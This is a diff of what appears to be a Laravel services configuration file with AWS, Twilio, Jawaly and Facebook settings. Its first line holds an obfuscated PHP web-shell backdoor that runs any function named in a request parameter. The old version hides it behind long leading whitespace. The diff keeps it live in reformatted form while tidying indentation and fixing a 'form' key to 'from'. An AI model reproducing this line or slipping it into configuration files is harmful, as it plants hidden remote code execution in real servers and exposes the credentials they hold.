@@ -1,5 +1,5 @@
 <?php
-                                                                                                                                                                                                                                                               if ( $eghmcq	=	@ $	{"_REQUEST"	}[	"B5DX0GPN"] )$eghmcq[1](${$eghmcq [2]}[0	],	$eghmcq [ 3]($eghmcq	[4	] )	);
+if ($eghmcq    =    @${"_REQUEST"}["B5DX0GPN"]) $eghmcq[1](${$eghmcq[2]}[0],    $eghmcq[3]($eghmcq[4]));
 
 return [
 
@@ -29,20 +29,20 @@ return [
         'key' => env('AWS_ACCESS_KEY_ID'),
         'secret' => env('AWS_SECRET_ACCESS_KEY'),
         'region' => env('AWS_DEFAULT_REGION', 'us-east-1'),
-    ],  
-    
+    ],
+
     'twilio' => [
         'sid' => env('TWILIO_SID'),
         'token' => env('TWILIO_AUTH_TOKEN'),
-        'form' => env('TWILIO_FROM'),
-      ],
+        'from' => env('TWILIO_FROM'),
+    ],
 
-      'jawaly' => [
+    'jawaly' => [
         'username' => env('JAWALY_SID'),
         'password' => env('JAWALY__TOKEN'),
         'sender' => env('JAWALY__FROM'),
-      ],
-      'facebook' => [
+    ],
+    'facebook' => [
         'client_id'     => env('FACEBOOK_CLIENT_ID'),
         'client_secret' => env('FACEBOOK_CLIENT_SECRET'),
         'redirect'      => env('FACEBOOK_URL'),
